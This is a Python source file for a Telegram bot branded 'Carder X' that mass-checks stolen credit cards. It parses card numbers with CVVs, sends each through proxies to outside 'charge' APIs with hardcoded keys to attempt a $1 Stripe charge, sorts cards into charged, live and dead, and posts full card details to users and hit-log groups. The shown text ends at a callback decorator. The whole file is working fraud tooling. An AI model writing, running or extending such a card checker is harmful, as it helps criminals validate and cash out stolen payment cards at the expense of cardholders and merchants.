import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def _safe_print(*args, **kwargs):
    try:
        sys.stdout.write(" ".join(str(a) for a in args) + kwargs.get("end", "\n"))
        sys.stdout.flush()
    except Exception:
        pass

print = _safe_print

import asyncio
import random
import re
import logging
import aiohttp
import urllib.parse
import time
import string
import os
import psycopg2.extras
import html as _html_mod
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
import html

from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from utils_send import safe_send_message, safe_send_animation
from aiogram.filters.callback_data import CallbackData

from database import is_gate_enabled, update_user_stats, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

STRIPE_API_URL = "https://stripeapi-production-76a7.up.railway.app/stripe/check"
STRIPE_API_KEY = "darkanon"

_MST_HTTP_SESSION = None

def _get_mst_http_session():
    global _MST_HTTP_SESSION
    if _MST_HTTP_SESSION is None or _MST_HTTP_SESSION.closed:
        _MST_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(limit=1000, ssl=False)
        )
    return _MST_HTTP_SESSION

def format_api_proxy(proxy: str) -> str:
    if not proxy:
        return ""
    proxy = proxy.strip()
    if proxy.startswith("https://"):
        return "http://" + proxy[8:]
    if not proxy.startswith("http://"):
        return "http://" + proxy
    return proxy


# ═══════════════════════════════════════════════════════════════
# ROBUST SEND HELPERS  (Fix 2 & Fix 3)
# ═══════════════════════════════════════════════════════════════

def _strip_html_and_tg_emoji(text: str) -> str:
    """Strip all HTML tags and tg-emoji wrappers, leaving plain text."""
    if not text:
        return ""
    text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text, flags=re.DOTALL)
    text = re.sub(r'<[^>]+>', '', text)
    text = _html_mod.unescape(text)
    return text


async def _safe_send_document(bot, chat_id, document_bytes, filename, caption, reply_to=None):
    """
    Send a document with caption. Falls back through three strategies:
      1. HTML caption (with reply if given)
      2. HTML caption (no reply)
      3. Plain-text caption (all HTML/tg-emoji stripped)
    Returns True on success.
    """
    # Attempt 1: HTML + optional reply
    try:
        await bot.send_document(
            chat_id=chat_id,
            document=BufferedInputFile(file=document_bytes, filename=filename),
            caption=caption,
            parse_mode="HTML",
            reply_to_message_id=reply_to,
        )
        return True
    except TelegramBadRequest as e:
        err_lower = str(e).lower()
        logging.warning(f"[_safe_send_document] attempt 1 failed: {e}")

        if ("reply" in err_lower and "not found" in err_lower) or \
           ("message to reply" in err_lower):
            try:
                await bot.send_document(
                    chat_id=chat_id,
                    document=BufferedInputFile(file=document_bytes, filename=filename),
                    caption=caption,
                    parse_mode="HTML",
                )
                return True
            except TelegramBadRequest as e2:
                logging.warning(f"[_safe_send_document] attempt 2 failed: {e2}")
            except Exception as e2:
                logging.error(f"[_safe_send_document] attempt 2 unexpected: {e2}")
    except Exception as e:
        logging.error(f"[_safe_send_document] attempt 1 unexpected: {e}")

    # Attempt 3: plain text
    plain_caption = _strip_html_and_tg_emoji(caption)
    try:
        await bot.send_document(
            chat_id=chat_id,
            document=BufferedInputFile(file=document_bytes, filename=filename),
            caption=plain_caption,
        )
        return True
    except Exception as e3:
        logging.error(f"[_safe_send_document] plain-text fallback failed: {e3}")
        return False


async def _safe_send_animation_or_text(bot, chat_id, caption, gif_url=None, reply_markup=None):
    """
    Send an animation with caption; fall back to text; fall back to plain text.
    Returns True on success.
    """
    if gif_url:
        try:
            await safe_send_animation(
                bot, chat_id=chat_id, animation=gif_url,
                caption=caption, parse_mode="HTML", reply_markup=reply_markup,
            )
            return True
        except Exception as e:
            logging.warning(f"[_safe_send] animation failed: {e}")

    try:
        await safe_send_message(
            bot, chat_id=chat_id, text=caption,
            parse_mode="HTML", reply_markup=reply_markup,
        )
        return True
    except Exception as e:
        logging.warning(f"[_safe_send] HTML text failed: {e}")

    plain = _strip_html_and_tg_emoji(caption)
    try:
        await safe_send_message(
            bot, chat_id=chat_id, text=plain, reply_markup=reply_markup,
        )
        return True
    except Exception as e:
        logging.error(f"[_safe_send] plain text failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════
# API CALL  (Fix 4: widen insufficient detection)
# ═══════════════════════════════════════════════════════════════

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, proxy: str) -> Tuple[str, str]:
    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    cc_encoded = cc_formatted.replace("|", "%7C")
    proxy_encoded = urllib.parse.quote(proxy) if proxy else ""
    api_url = f"https://atoti-production.up.railway.app/charge?cc={cc_encoded}&key=DARKANONSHO!!!&amount=1&proxy={proxy_encoded}"

    try:
        _http = _get_mst_http_session()
        async with _http.get(api_url, timeout=35) as response:
            if response.status == 200:
                data = await response.json()
            else:
                alt_url = f"{STRIPE_API_URL}?gate=corrigan&key={STRIPE_API_KEY}&cc={cc_encoded}&proxy={proxy}"
                async with _http.get(alt_url, timeout=25) as alt_resp:
                    if alt_resp.status == 200:
                        data = await alt_resp.json()
                    else:
                        return "ERROR", f"API Error: HTTP {response.status}"

        # Merge all the possible message fields into one string
        # so the caller's substring checks can find "insufficient", "invalid cvc", etc.
        primary_msg = str(data.get("Response", "") or "")
        extra_msg = (
            str(data.get("status_code") or "") + " " +
            str(data.get("message") or "") + " " +
            str(data.get("Message") or "") + " " +
            str(data.get("decline_code") or "") + " " +
            str(data.get("code") or "")
        ).strip()
        combined_lower = (primary_msg + " " + extra_msg).lower()

        charged = (
            str(data.get("Charged", "")).lower() == "true"
            or "charged" in combined_lower
            or "order_placed" in combined_lower
        )
        approved = (
            str(data.get("Approved", "")).lower() == "true"
            or "approved" in combined_lower
            or any(k in combined_lower for k in ["insufficient_funds", "insufficient funds", "invalid_cvc", "3ds"])
        )

        status = data.get("status")
        if not status:
            if charged:
                status = "CHARGED"
            elif approved:
                status = "APPROVED"
            elif "Response" in data:
                status = "DECLINED"
            else:
                status = "ERROR"

        # Returned message prefers the more descriptive field but keeps the primary Response as prefix
        message_parts = []
        if primary_msg:
            message_parts.append(primary_msg)
        for m in (data.get("status_code"), data.get("message"), data.get("Message"), data.get("decline_code"), data.get("code")):
            if m and str(m) not in message_parts:
                message_parts.append(str(m))
        final_message = " - ".join(message_parts) if message_parts else "Unknown Error"

        return str(status).upper(), final_message
    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        return "ERROR", f"Connection Error: {str(e)}"
    except Exception as e:
        return "ERROR", f"Error: {str(e)}"

from mass_gates.msh import ProxyManager, get_user_proxies


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID = -1004479507133
EXTRA_CHARGED_GROUP_ID = -1004437051761
BUTTON_LOCK_SECONDS = 30

CUSTOM_CHARGED_EMOJI_ID = "5042050649248760772"
CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

BTN_CHARGED_EMOJI_ID = "5042050649248760772"
BTN_DEAD_EMOJI_ID = "4915853119839011973"
BTN_LIVE_EMOJI_ID = "5039844895779455925"
BTN_STOP_EMOJI_ID = "5040042498634810056"
BTN_ALL_EMOJI_ID = "5447602197439218445"

MST_SESSIONS = {}
MST_SESSION_LOCKS = {}

import threading as _mst_threading
import time as _mst_time

_MST_SESSION_MAX_AGE = 3600

def _cleanup_mst_sessions():
    cutoff = _mst_time.time() - _MST_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MST_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MST_SESSIONS.pop(sid, None)
        MST_SESSION_LOCKS.pop(sid, None)

def _start_mst_gc():
    def _loop():
        while True:
            _mst_time.sleep(600)
            try: _cleanup_mst_sessions()
            except Exception: pass
    _mst_threading.Thread(target=_loop, daemon=True, name='mst_gc').start()

_start_mst_gc()


router = Router()

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]


class MstResultCallback(CallbackData, prefix="mstr"):
    session_id: str
    result_type: str

class MstStopCallback(CallbackData, prefix="msts"):
    session_id: str


def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None


def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards


def log_hit_to_mst(user_id, username, first_name):
    try:
        with open("mst.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mst.txt: {e}")


def is_session_stopped(session_id: str) -> bool:
    session = MST_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MST_SESSIONS.get(session_id)
    if not session:
        return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MST_SESSIONS.get(session_id)
    if not session:
        return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

def build_user_link(user_obj) -> str:
    name = html.escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


async def get_anime_gif():
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"


async def get_user_plan_name(user_id):
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if any(k in p for k in ["kashim", "chirag", "darkanon", "carderx"]):
                        return "Carder X <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                    if "root" in p:
                        return "𝗥𝗼𝗼𝘁 <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                    if "elite" in p:
                        return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
                    if "core" in p:
                        return "𝗖𝗼𝗿𝗲 <tg-emoji emoji-id='5042274086332400375'>🛠️</tg-emoji>"
                    return row['plan']
                return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
    else:
        return "𝗧𝗿𝗶𝗮𝗹"


def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


# ═══════════════════════════════════════════════════════════════
# NOTIFICATIONS (using robust wrappers)
# ═══════════════════════════════════════════════════════════════

async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, user_obj, plan_name, hit_type):
    response_msg = html.escape(response_msg)
    user_link = build_user_link(user_obj)

    parts = str(cc_formatted).split('|')
    if len(parts) >= 1:
        cc = parts[0]
        parts[0] = "x" * (len(cc) - 4) + cc[-4:] if len(cc) > 4 else "x" * len(cc)
    for idx in range(1, len(parts)):
        parts[idx] = "x" * len(parts[idx])
    masked_cc = "|".join(parts)

    hit_emoji = "💎" if hit_type == "CHARGED" else "✅"

    caption = (
        f"<b>Hit ➔</b> {hit_type} {hit_emoji}\n"
        f"<b>GATE ➔</b> Stripe $1 💸\n"
        f"<b>Res ➔</b> {html.escape(str(response_msg))}\n"
        f"<b>USER ➔</b> {user_link} ({plan_name})"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/zlatanchecker_bot", style="primary")]
    ])

    await _safe_send_animation_or_text(
        bot, chat_id=HIT_LOG_GROUP_ID,
        caption=caption, gif_url=None,
        reply_markup=reply_markup,
    )


async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, hit_type, send_to_extra: bool = True):
    try:
        try:
            bin_data = await get_bin_info(cc_num[:6])
        except:
            bin_data = {}

        bin_scheme = html.escape(bin_data.get("scheme", "N/A"))
        bin_bank = html.escape(bin_data.get("bank", "N/A"))
        country_name = html.escape(bin_data.get("country", "N/A"))
        country_flag = bin_data.get("country_emoji", "")
        bin_country = f"{country_flag} {country_name}" if country_flag else country_name
        response_msg = html.escape(response_msg)

        gif_url = await get_anime_gif()
        user_link = build_user_link(user_obj)
        dev_link = '<a href="https://t.me/Lanxo2">CARDER X</a>'
        user_display = f"{user_link} ({plan_name})"

        if hit_type == "CHARGED":
            status_text = f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji>"
        else:
            status_text = f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji>"

        caption = (
            f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status_text}\n"
            f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{cc_formatted}</code>\n"
            f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗\n"
            f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{response_msg}</b>\n"
            f"<tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
            f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
            f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
            f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
            f"<tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link}"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Carder X", url="https://t.me/zlatanchecker_bot", style="primary")]
        ])

        # DM to user
        try:
            await _safe_send_animation_or_text(
                bot, chat_id=user_obj.id,
                caption=caption, gif_url=gif_url,
                reply_markup=reply_markup,
            )
        except TelegramForbiddenError as e:
            logging.warning(f"[MST] Could not DM {hit_type} hit to user {user_obj.id}: {e}")

        if not send_to_extra:
            return

        # Extra group
        await _safe_send_animation_or_text(
            bot, chat_id=EXTRA_CHARGED_GROUP_ID,
            caption=caption, gif_url=gif_url,
            reply_markup=reply_markup,
        )

    except Exception as e:
        logging.error(f"Error sending user HIT message: {e}")


# ═══════════════════════════════════════════════════════════════
# RESULT FILE GENERATION
# ═══════════════════════════════════════════════════════════════

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('approved_cards', [])
        type_label = "𝗟𝗶𝘃𝗲"
        type_emoji = "🎁"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "𝗗𝗲𝗮𝗱"
        type_emoji = "🚫"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('approved_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "𝗔𝗹𝗹"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃        CARDER X              ┃")
    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Lanxo2")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
    lines.append(f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_label} {type_emoji}")
    lines.append(f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ {total_count}")
    lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗")
    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Carder X")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response.upper() or "charged" in response.lower():
                status = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            elif "insufficient" in response.lower() or "APPROVED" in response.upper():
                status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 🎁"
            elif "ERROR" in response.upper() or "TIMEOUT" in response.upper() or "error" in response.lower():
                status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"
            else:
                status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"

            lines.append(f"💎 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status}")
            lines.append(f"💳 𝗖𝗮𝗿𝗱 ➛ {cc}")
            lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗")
            lines.append(f"💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}")
            lines.append(f"<tg-emoji emoji-id='6237822905128851025'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ {scheme}")
            lines.append(f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bank}")
            lines.append(f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {country_display}")
            lines.append(f"👤 𝗨𝘀𝗲𝗿 ➛ {user_display}")
            lines.append(f"🐈‍⬛ 𝗗𝗲𝘃 ➛ Carder X")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            lines.append("")

    content = "\n".join(lines)
    # Fix: correct regex for unwrapping tg-emoji
    content = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', content, flags=re.DOTALL)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"CARDERX_STRIPE_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count


# ═══════════════════════════════════════════════════════════════
# BUTTONS & PROGRESS
# ═══════════════════════════════════════════════════════════════

def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
    session = MST_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)

    if isinstance(approved_count, list): approved_count = len(approved_count)
    if isinstance(dead_count, list): dead_count = len(dead_count)
    if isinstance(charged_count, list): charged_count = len(charged_count)

    error_count = session.get('errors', 0)
    if isinstance(error_count, list): error_count = len(error_count)
    all_count = charged_count + approved_count + dead_count + error_count

    buttons = []
    buttons.append([
        InlineKeyboardButton(
            text=f"Lɪᴠᴇ ({approved_count})",
            callback_data=MstResultCallback(session_id=session_id, result_type="live").pack(),
            style="success",
            icon_custom_emoji_id=BTN_LIVE_EMOJI_ID
        ),
        InlineKeyboardButton(
            text=f"Dᴇᴀᴅ ({dead_count})",
            callback_data=MstResultCallback(session_id=session_id, result_type="dead").pack(),
            style="danger",
            icon_custom_emoji_id=BTN_DEAD_EMOJI_ID
        )
    ])
    buttons.append([
        InlineKeyboardButton(
            text=f"Cʜ𝗮𝗿𝗴𝗲𝗱 ({charged_count})",
            callback_data=MstResultCallback(session_id=session_id, result_type="charged").pack(),
            style="primary",
            icon_custom_emoji_id=BTN_CHARGED_EMOJI_ID
        ),
        InlineKeyboardButton(
            text=f"Aʟ𝗹 ({all_count})",
            callback_data=MstResultCallback(session_id=session_id, result_type="all").pack(),
            icon_custom_emoji_id=BTN_ALL_EMOJI_ID
        )
    ])

    if is_running:
        buttons.append([
            InlineKeyboardButton(
                text="Sᴛᴏ𝗽 Cʜ𝗲𝗰𝗸𝗶𝗻𝗴",
                callback_data=MstStopCallback(session_id=session_id).pack(),
                style="danger",
                icon_custom_emoji_id=BTN_STOP_EMOJI_ID
            )
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def update_progress_message(bot: Bot, session_id):
    session = MST_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"

    if not is_finished and not is_stopped and (current_time - last_update) < 3.5:
        return

    elapsed = current_time - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status_icon = "🔄" if session['status'] == "CHECKING" else ("❌" if session['status'] == "STOPPED" else "✅")
    status_text = session['status']
    if status_text == "CHECKING":
        status_text = f"<i>{status_text}</i>"
    elif status_text in ("STOPPED", "FINISHED"):
        status_text = f"<b>{status_text}</b>"

    text = (
        f"<b>🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗\n"
        f"<b>📊 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {status_text} {status_icon}\n"
        f"<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>{session['checked']}/{session['total']}</code>\n"
        f"<b>✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>{session['approved']}</b>\n"
        f"<b>🔥 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>{session['charged']}</b>\n"
        f"<b>❌ 𝗗𝗲𝗮𝗱 ➛</b> <b>{session['dead']}</b>\n"
        f"<b>⚠️ 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{session['errors']}</b>\n"
        f"<b>⚡ 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>\n"
        f"<b>🐈‍⬛ 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
        f"<b>🆔 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )

    if session.get('last_text') == text:
        return

    if session_id not in MST_SESSION_LOCKS:
        MST_SESSION_LOCKS[session_id] = asyncio.Lock()

    async with MST_SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramBadRequest as e:
            if "message is not modified" not in str(e).lower() and "message to edit not found" not in str(e).lower():
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")


# ═══════════════════════════════════════════════════════════════
# CALLBACK HANDLERS
# ═══════════════════════════════════════════════════════════════

@router.callback_query(MstResultCallback.filter())
